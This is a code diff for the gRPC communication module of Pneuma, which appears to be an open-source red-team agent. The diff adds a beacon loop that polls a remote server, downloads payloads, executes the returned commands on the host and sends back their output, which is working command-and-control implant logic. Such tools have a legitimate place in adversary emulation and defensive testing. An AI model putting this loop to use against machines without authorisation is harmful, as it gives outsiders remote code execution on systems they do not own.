@@ -2,7 +2,11 @@ package sockets
 
 import (
 	"context"
+	"encoding/json"
+	"github.com/preludeorg/pneuma/commands"
+	"github.com/preludeorg/pneuma/util"
 	"log"
+	"strings"
 	"time"
 
 	pb "github.com/preludeorg/pneuma/sockets/protos"
@@ -17,25 +21,46 @@ func init() {
 
 func (contact GRPC) Communicate(address string, sleep int, beacon Beacon) {
 	for {
-		conn, err := grpc.Dial(address, grpc.WithInsecure(), grpc.WithBlock())
-		if err != nil {
-			log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", address)
-		} else {
-			interact(conn, beacon)
+		beacon.Links = beacon.Links[:0]
+		for {
+			body := beaconSend(address, beacon)
+			var tempB Beacon
+			json.Unmarshal(body, &tempB)
+			if(len(tempB.Links)) == 0 {
+				break
+			}
+			for _, link := range tempB.Links {
+				var payloadPath string
+				if len(link.Payload) > 0 {
+					payloadPath = requestPayload(link.Payload)
+				}
+				response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath)
+				link.Response = strings.TrimSpace(response)
+				link.Status = status
+				link.Pid = pid
+				beacon.Links = append(beacon.Links, link)
+			}
 		}
 		jitterSleep(sleep, "GRPC")
 	}
 }
 
-func interact(conn *grpc.ClientConn, beacon Beacon) {
+func beaconSend(address string, beacon Beacon) []byte {
+	conn, err := grpc.Dial(address, grpc.WithInsecure(), grpc.WithBlock())
+	if err != nil {
+		log.Fatalf("[-] %s is either unavailable or a firewall is blocking traffic.", address)
+	}
 	defer conn.Close()
 	c := pb.NewBeaconClient(conn)
 
 	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
 	defer cancel()
-	r, err := c.Handle(ctx, &pb.BeaconIncoming{Name: beacon.Name})
+
+	data, _ := json.Marshal(beacon)
+	r, err := c.Handle(ctx, &pb.BeaconIncoming{Beacon: string(util.Encrypt(data))})
 	if err != nil {
-		log.Fatalf("could not greet: %v", err)
+		log.Println(err)
+		return nil
 	}
-	log.Printf("Greeting: %s", r.GetName())
+	return []byte(r.GetBeacon())
 }
